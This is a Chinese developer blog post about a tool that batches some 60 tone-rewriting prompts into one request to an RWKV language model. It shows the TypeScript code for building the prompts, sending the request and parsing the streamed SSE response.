itemtype="http://schema.org/Person"><meta itemprop="name" content="Moment"/> <meta itemprop="url" content="https://juejin.cn/user/3782764966460398"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            如何一次性生成 60 种语气表达？RWKV 模型告诉你答案 ❗❗❗
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3782764966460398/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Moment
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T07:00:25.000Z" title="Wed Jan 14 2026 07:00:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"「";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"」";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"✓";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><p>在日常沟通中，我们经常需要根据不同的对象和场景调整语气。向老板汇报工作时需要正式严谨，和同事交流时可以轻松随意，写文案时又需要符合品牌调性。手动调整这些语气不仅耗时，还容易词穷。特别是在需要快速产出多种风格文案的场景下，比如社交媒体运营需要同时准备正式版、幽默版、情感版等多个版本，传统的逐个改写方式效率极低。</p>
<p>基于这样的痛点，我开发了这个 <code>RWKV</code> 并行语气转换工具。它能够接收一段文本，通过 <code>RWKV</code> 大语言模型，一次性并行生成 60 多种不同语气和风格的表达方式，涵盖职场、生活、方言、文学、网络等多个维度，极大提升了内容创作和沟通表达的效率。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a6a3743e30bf49e2b9273a1b53c01f70~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9tZW50:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768978865&amp;x-signature=CafJrmaQclDNmT0a5nycSAILwa4%3D" alt="项目效果图" loading="lazy"/></p>
<p>从上图可以看到，工具的界面简洁直观。用户只需在底部输入框中输入原始文本，点击发送按钮，系统就会同时生成多种语气版本。每个卡片代表一种风格，包含风格图标、名称和转换后的内容。所有结果实时流式返回，用户可以立即看到生成进度，并且每个结果都支持一键复制，方便快速使用。</p>
<h2 data-id="heading-0">核心特性与技术实现</h2>
<p>这个项目最大的特点是并行生成能力。传统的语气转换工具通常是串行处理，即逐个风格依次生成，这样会导致等待时间过长。而本工具通过在后端同时处理多个转换请求，前端采用流式渲染技术，实时展示每个风格的生成进度，整体响应速度大幅提升。</p>
<p>在前端技术选型上，项目采用了 <code>React 19</code> 作为 UI 框架，配合 <code>Rsbuild</code> 作为构建工具。相比传统的 <code>Webpack</code> 或 <code>Vite</code>，<code>Rsbuild</code> 提供了更快的构建速度和更简洁的配置体验。样式层面使用了 <code>Tailwind CSS 4</code>，通过精心设计的渐变色彩和流畅的动画效果，打造出现代化的视觉体验。整个界面采用浅色主题，柔和的紫粉渐变背景配合玻璃态效果，既美观又不影响内容的阅读。</p>
<p>项目完整的技术栈包括：<code>React 19</code> 提供强大的 UI 渲染能力，<code>TypeScript</code> 确保类型安全，<code>Rsbuild</code> 负责快速构建，<code>Tailwind CSS 4</code> 处理样式，<code>Lucide React</code> 提供图标支持，<code>Class Variance Authority</code> 管理组件变体。这套组合既保证了开发效率，也确保了运行时性能。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d63a7289635e4a9bb14d27e662e086c1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9tZW50:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768978865&amp;x-signature=gR%2BDqDeqLVIoNDDL7GMODkSmySI%3D" alt="接口请求参数" loading="lazy"/></p>
<p>从接口请求参数可以看到，后端接收的核心数据结构相对简单。<code>contents</code> 字段是一个数组，包含了所有需要转换的 <code>prompt</code> 内容。每个 <code>prompt</code> 都是一个完整的指令，包含了风格要求和用户输入的原始文本。系统会根据这些 <code>prompt</code> 并行调用 <code>RWKV</code> 模型进行生成，同时还支持多种参数调优，比如 <code>temperature</code>、<code>top_k</code>、<code>top_p</code> 等，以获得更好的生成效果。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/09552fa188414480a1b125c4bffd75c7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9tZW50:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768978865&amp;x-signature=Rx1Xul8MFNxryXvxAHcnO6bDaeQ%3D" alt="接口响应数据" loading="lazy"/></p>
<p>响应数据采用了 <code>Server-Sent Events</code>（<code>SSE</code>）的流式传输方式。每个数据块都是一个 <code>JSON</code> 对象，包含了 <code>choices</code> 数组，其中每个 <code>choice</code> 对应一个风格的生成结果。通过 <code>index</code> 字段标识具体是哪个风格，<code>delta</code> 中的 <code>content</code> 字段则包含了本次推送的文本片段。前端接收到这些数据后，会实时更新对应卡片的内容，用户可以看到文字逐字生成的效果，体验非常流畅。</p>
<h2 data-id="heading-1">并发生成的核心实现</h2>
<p>整个项目的精髓在于如何实现真正的并发生成。先看生成 <code>contents</code> 数组的逻辑：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">generateStyleContents</span>(<span class="hljs-params">userInput: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">string</span>[] {
  <span class="hljs-keyword">const</span> configs = <span class="hljs-title function_">getMergedStyleConfigs</span>();
  <span class="hljs-keyword">return</span> configs.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">config</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (config.<span class="hljs-property">prompt</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">"${{input}}"</span>)) {
      <span class="hljs-keyword">return</span> config.<span class="hljs-property">prompt</span>.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\$\{\{input\}\}/g</span>, userInput);
    }
    <span class="hljs-keyword">return</span> <span class="hljs-string">`<span class="hljs-subst">${config.prompt}</span>\n\nUser: <span class="hljs-subst">${userInput}</span>\n\nAssistant: &lt;think&gt;\n&lt;/think&gt;`</span>;
  });
}
</code></pre>
<p>这个函数做的事情很简单：遍历所有风格配置，将每个风格的 <code>prompt</code> 模板中的 <code>${{input}}</code> 占位符替换为用户的真实输入。<code>generateStyleContents</code> 函数会调用 <code>getMergedStyleConfigs()</code> 获取所有风格配置。假设用户输入"明天要开会"，经过这个函数处理后，会得到一个包含 60 个完整 <code>prompt</code> 的数组。每个 <code>prompt</code> 都是独立的，包含了该风格的要求描述、约束条件，以及用户输入。</p>
<p>有了这个数组，接下来就是发送请求了。关键在于，我们把整个 <code>contents</code> 数组一次性发送给后端：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(config.<span class="hljs-property">apiUrl</span>, {
  <span class="hljs-attr">method</span>: <span class="hljs-string">"POST"</span>,
  <span class="hljs-attr">headers</span>: {
    <span class="hljs-string">"Content-Type"</span>: <span class="hljs-string">"application/json"</span>,
    <span class="hljs-title class_">Accept</span>: <span class="hljs-string">"*/*"</span>,
    <span class="hljs-string">"Accept-Language"</span>: <span class="hljs-string">"zh-CN,zh;q=0.9"</span>,
  },
  <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({
    contents, <span class="hljs-comment">// 这里是 60 个 prompt 的数组</span>
    <span class="hljs-attr">max_tokens</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">temperature</span>: <span class="hljs-number">0.95</span>,
    <span class="hljs-attr">top_k</span>: <span class="hljs-number">50</span>,
    <span class="hljs-attr">top_p</span>: <span class="hljs-number">0.9</span>,
    <span class="hljs-attr">pad_zero</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">alpha_presence</span>: <span class="hljs-number">1.0</span>,
    <span class="hljs-attr">alpha_frequency</span>: <span class="hljs-number">1.0</span>,
    <span class="hljs-attr">alpha_decay</span>: <span class="hljs-number">0.996</span>,
    <span class="hljs-attr">chunk_size</span>: <span class="hljs-number">128</span>,
    <span class="hljs-attr">stream</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">password</span>: config.<span class="hljs-property">password</span>,
  }),
  signal,
});
</code></pre>
<p>注意看请求体中的 <code>contents</code> 字段，这就是我们刚才通过 <code>generateStyleContents</code> 函数生成的 60 个 <code>prompt</code>。后端收到这个数组后，会同时启动 60 个生成任务，每个任务对应数组中的一个 <code>prompt</code>。数组的索引位置（0, 1, 2, ..., 59）就是每个任务的 ID，这个 ID 会在返回的 <code>index</code> 字段中体现。</p>
<h2 data-id="heading-2">流式响应的解析机制</h2>
<p>后端采用 <code>Server-Sent Events</code>（<code>SSE</code>）格式返回流式数据。每个数据块的格式大致是这样的：</p>
<pre><code class="hljs language-css" lang="css">data: {"<span class="hljs-selector-tag">object</span>":<span class="hljs-string">"chat.completion.chunk"</span>,<span class="hljs-string">"choices"</span>:[{"index":<span class="hljs-number">12</span>,<span class="hljs-string">"delta"</span>:{"<span class="hljs-attribute">content</span>":<span class="hljs-string">"明"</span>}},{"index":<span class="hljs-number">23</span>,<span class="hljs-string">"delta"</span>:{"<span class="hljs-attribute">content</span>":<span class="hljs-string">"今"</span>}},{"index":<span class="hljs-number">5</span>,<span class="hljs-string">"delta"</span>:{"<span class="hljs-attribute">content</span>":<span class="hljs-string">"后"</span>}}]}

data: {"<span class="hljs-selector-tag">object</span>":<span class="hljs-string">"chat.completion.chunk"</span>,<span class="hljs-string">"choices"</span>:[{"index":<span class="hljs-number">12</span>,<span class="hljs-string">"delta"</span>:{"<span class="hljs-attribute">content</span>":<span class="hljs-string">"天"</span>}},{"index":<span class="hljs-number">23</span>,<span class="hljs-string">"delta"</span>:{"<span class="hljs-attribute">content</span>":<span class="hljs-string">"天"</span>}}]}

data: [DONE]
</code></pre>
<p>看到了吗？每个 <code>choice</code> 对象都有一个 <code>index</code> 字段。这个 <code>index</code> 就是对应 <code>contents</code> 数组中的位置。比如 <code>index</code> 为 12 的 <code>choice</code>，对应的就是 <code>contents[12]</code> 这个 <code>prompt</code> 的生成结果。前端正是靠这个 <code>index</code>，知道把返回的文本片段更新到哪个风格卡片上。</p>
<p>解析流式数据的代码使用了 <code>fetch</code> API 的流式读取能力：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> reader = response.<span class="hljs-property">body</span>?.<span class="hljs-title function_">getReader</span>();
<span class="hljs-keyword">const</span> decoder = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TextDecoder</span>();
<span class="hljs-keyword">let</span> buffer = <span class="hljs-string">""</span>;

<span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
  <span class="hljs-keyword">const</span> { done, value } = <span class="hljs-keyword">await</span> reader.<span class="hljs-title function_">read</span>();

  <span class="hljs-keyword">if</span> (done) <span class="hljs-keyword">break</span>;

  buffer += decoder.<span class="hljs-title function_">decode</span>(value, { <span class="hljs-attr">stream</span>: <span class="hljs-literal">true</span> });
  <span class="hljs-keyword">const</span> lines = buffer.<span class="hljs-title function_">split</span>(<span class="hljs-string">"\n"</span>);
  buffer = lines.<span class="hljs-title function_">pop</span>() || <span class="hljs-string">""</span>;

  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> line <span class="hljs-keyword">of</span> lines) {
    <span class="hljs-keyword">const</span> trimmedLine = line.<span class="hljs-title function_">trim</span>();
    <span class="hljs-keyword">if</span> (!trimmedLine || !trimmedLine.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">"data: "</span>)) <span class="hljs-keyword">continue</span>;

    <span class="hljs-keyword">const</span> data = trimmedLine.<span class="hljs-title function_">slice</span>(<span class="hljs-number">6</span>);
    <span class="hljs-keyword">if</span> (data === <span class="hljs-string">"[DONE]"</span>) {
      <span class="hljs-comment">// 所有任务完成</span>
      <span class="hljs-keyword">const</span> completedResults = initialResults.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">result</span>) =&gt;</span> ({
        ...result,
        <span class="hljs-attr">isComplete</span>: <span class="hljs-literal">true</span>,
      }));
      <span class="hljs-title function_">onUpdate</span>(completedResults);
      <span class="hljs-keyword">continue</span>;
    }

    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">const</span> json = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(data);
      <span class="hljs-keyword">if</span> (json.<span class="hljs-property">choices</span> &amp;&amp; <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(json.<span class="hljs-property">choices</span>)) {
        json.<span class="hljs-property">choices</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">choice: <span class="hljs-built_in">any</span></span>) =&gt;</span> {
          <span class="hljs-keyword">const</span> index = choice.<span class="hljs-property">index</span>;
          <span class="hljs-keyword">const</span> deltaContent = choice.<span class="hljs-property">delta</span>?.<span class="hljs-property">content</span> || <span class="hljs-string">""</span>;
          <span class="hljs-keyword">if</span> (deltaContent &amp;&amp; initialResults[index]) {
            <span class="hljs-comment">// 根据 index 找到对应的结果对象，追加文本片段</span>
            initialResults[index].<span class="hljs-property">content</span> += deltaContent;
          }
        });
        <span class="hljs-title function_">onUpdate</span>([...initialResults]);
      }
    } <span class="hljs-keyword">catch</span> (e) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">"解析 JSON 失败:"</span>, e);
    }
  }
}
</code></pre>
<p>这段代码的核心逻辑是：</p>
<ol>
<li>使用 <code>TextDecoder</code> 逐块解码二进制流，通过 <code>response.body?.getReader()</code> 获取流读取器</li>
<li>按行分割数据，因为每行是一个完整的 <code>SSE</code> 消息</li>
<li>提取 <code>"data: "</code> 后面的 <code>JSON</code> 数据</li>
<li>解析出 <code>choices</code> 数组，遍历每个 <code>choice</code></li>
<li>通过 <code>choice.index</code> 找到对应的结果对象，将 <code>choice.delta.content</code> 追加上去</li>
<li>调用 <code>onUpdate</code> 触发界面更新</li>
</ol>
<p>这种增量更新的方式非常高效。不同风格的生成速度可能不一样，有的快有的慢，但每个风格的更新是完全独立的，互不干扰。用户可以实时看到每个卡片的内容逐字增加，体验非常流畅。</p>
<h2 data-id="heading-3">为什么这种方式能实现真并发</h2>
<p>传统的做法是循环调用 <code>API</code>，每次生成一种风格，等这个风格生成完了再生成下一个。如果有 60 种风格，每个风格平均生成 2 秒，那总共需要 120 秒。这种串行的方式效率极低。</p>
<p>而我们这种方式，是把 60 个 <code>prompt</code> 打包成一个数组，一次性发送给后端。后端收到后，会并发地处理这 60 个任务。虽然每个任务还是需要 2 秒，但因为是并发执行，所以总耗时只有 2 秒多一点（加上一些网络延迟和任务调度开销）。</p>
<p>关键点在于：</p>
<ul>
<li><code>contents</code> 数组的长度决定了并发数量</li>
<li>后端通过 <code>index</code> 标识每个任务的结果</li>
<li>前端通过 <code>index</code> 将结果精确地更新到对应位置</li>
</ul>
<p>这样就实现了真正的并行生成，效率提升了几十倍。</p>
<h2 data-id="heading-4">部署和使用</h2>
<p>项目的部署很简单。如果你熟悉 <code>Node.js</code>，直接 <code>npm install</code> 安装依赖，<code>npm run dev</code> 启动开发服务器就能用。构建生产版本也就是一个 <code>npm run build</code> 的事。</p>
